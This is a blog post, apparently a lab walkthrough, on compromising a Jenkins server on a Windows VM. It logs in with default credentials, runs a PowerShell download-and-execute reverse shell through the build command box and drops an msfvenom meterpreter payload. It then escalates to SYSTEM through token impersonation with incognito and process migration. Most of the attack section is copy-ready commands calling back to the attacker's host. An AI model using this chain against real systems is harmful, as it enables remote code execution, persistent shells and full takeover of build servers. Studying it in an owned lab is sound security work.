---
title: "jenkins"
date: 2022-01-08T14:37:40-05:00
draft: false
---

if you've worked in any sort of SaaS/tech company, odds are you've used a CI/CD (continuous integration/continuous delivery and deployment) and DevOps tool. CI/CD is a method used to deliver apps to customers and clients by introducing automation into the stages of app development. it allows orgs to ship software "quickly" and "efficiently" (i used scare quotes because...well, if you've worked in a software company you'll know why). i'm going to see if i can try to exploit a common security misconfiguration on one of these tools, jenkins, then try to escalate privilege to get full system access.


## the difference between CI and CD

**CI**: involves devs making small changes and checks to their code. the scale of these changes can be huge so the process is automated to ensure that teams can build, test, and package their apps in a reliable way. CI can also help to streamline code changes.

**CD (continuous delivery)**: this is the automated delivery of completed code to environments like testing and development. 

**CD (continuous deployment)**: every change that passes the automated tests is automatically placed in production, resulting in many production deployments. this is the ultimate goal of many companies, given they're not constrained by regulatory or compliance requirements. 

![cicd](/CICD-DevOps.png)


## jenkins

jenkins is an open-source CI/CD automation software, written in java. it's used to implement CI/CD workflows, called pipelines. 

pipelines automate testing and reporting on isolated changes in a larger code base (in real time) and facilitates integration of disparate branches of code into a main branch. pipelines also rapidly detect defects in a code base, build the software, automate testing of builds, prepare code base for deployment/delivery, and ultimately deploy code to containers and virtual machines (as well as bare metal and cloud servers). 


for this experiment, i've spun up a windows VM that hosts the jenkins instance, and try to attack it from my kali VM. 

once everything is set up, let's start with a simple nmap scan of the target machine.

```
nmap -sT -Pn -v 10.10.77.68
```

![nmap](/jenkins-nmap.png)

the service at port 8080 is the jenkins server. to visit it, simply enter http://10.10.77.68:8080. at the login page, i'll enter my credentials (admin:admin) [note: default credentials for jenkins are usually admin:password or admin:admin] and be taken to the jenkins dashboard. there you'll see a "project" that was created just for this experiment.

![dashboard](/jenkins-dashboard.png)


since this is a windows application, i'll use the [nishang](https://github.com/samratashok/nishang) repo for a script, more specifically [this](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) reverse shell script. nishang also contains a whole bunch of scripts for initial access, enumeration, and privesc so check them all out if you'd like. 

in kali, i created a directory to download the script to.

```
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```

now let's create a simple web server so that this script can be downloaded into jenkins.

```
python -m SimpleHTTPServer 80
```


back in jenkins, if you click "project" > configure > build, you'll see a command box that lets you execute any command. 

![build](/jenkins-build.png)

first, start a netcat listener in kali.

```
nc -lvnp 9001
```

in the jenkins command box, enter the following command to download the powershell script to the target. remember to use the address of the HTTP server that was created.

```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.4.75:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.4.75 -Port 9001
```

save the build, then click "build now" from the project page. the netcat listener will receive a connection to the target.

![netcat](/jenkins-netcat.png)


to make privesc easier, it's better to switch to a meterpreter shell.

first, create an msfvenom payload in the same directory we saved the powershell script to.

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.4.75 LPORT=9002 -f exe -o jenkins.exe
```

download it to the machine similar to how we did it before, via the HTTP server and the build command box.

```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.4.75:8000/jenkins.exe','jenkins.exe')"
```

save this build, but before building, let's create a handler in metasploit to receive the connection.

```
> use exploit/multi/handler
> set PAYLOAD windows/meterpreter/reverse_tcp
> set LHOST 10.9.4.75
> set LPORT 9002
> run
```

back in jenkins, once you build and the payload has been downloaded to target, in the msfconsole shell type the following to get the meterpreter shell.

```
> Start-Process "jenkins.exe"
```


## token impersonation to gain system access

windows uses tokens to ensure accounts have the right privileges to carry out certain actions. tokens are assigned to an account when users log in or when they're authenticated. this is usually done by ```LSASS.exe```, generates the process responsible for authenticating users for the WINLOGON service. this is performed by using authentication packages like ```msgina.dll```. 

once authentication is successful, LSASS generates the user's access token, which is used to launch the initial shell. other processes the user initiates then inherit this token.

the user's access token consists of: user SIDs, group SIDs, privileges. you can read more about access tokens [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens).

there are 2 types of access tokens:
1. primary access tokens: associated with a user account, generated on log on
2. impersonation tokens: allow a particular process to use the token of another

the different levels of impersonation tokens:
- **SecurityAnonymous**: current user/client cannot impersonate another user/client
- **SecurityIdentification**: current user/client can get the identity and privileges of a client, but cannot impersonate the client
- **SecurityImpersonation**: current user/client can impersonate the client's security context on the local system
- **SecurityDelegation**: current user/client can impersonate the client's security context on a remote system

security context refers to the data structure that contain users' relevant security information.

privileges of an account allow the user to carry out particular actions. 
the most commonly abused privileges are:
- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

you can read more about them [here](https://www.exploit-db.com/papers/42556).


back in the meterpreter shell, we can check privs easily.

```
> whoami /priv
```

2 privileges should show up: SeDebugPrivilege and SeImpersonatePrivilege. let's use incognito mode to exploit this.

```
> load incognito
```

to check which tokens are available to us:
```
> list_tokens -g
```

the token **BUILTIN\Administrators** is available. impersonating it should be easy.

```
> impersonate_token "BUILTIN\Administrators"
```

it's good practice to double check privileges. 

```
> getuid
```

although we now have a higher privilege token, we may not actually have higher privilege permissions. windows uses a primary token of the process and not the impersonated token to determine what the process can do. so, we just migrate to a process with correct permissions. the safest process to pick is usually ```services.exe```.

```
> ps
> migrate <PID>
```

we've now migrated to an elevated process using its process ID (PID).


so, there it is. we exploited jenkins to further exploit security misconfigurations to get root access on the target system. pretty cool!











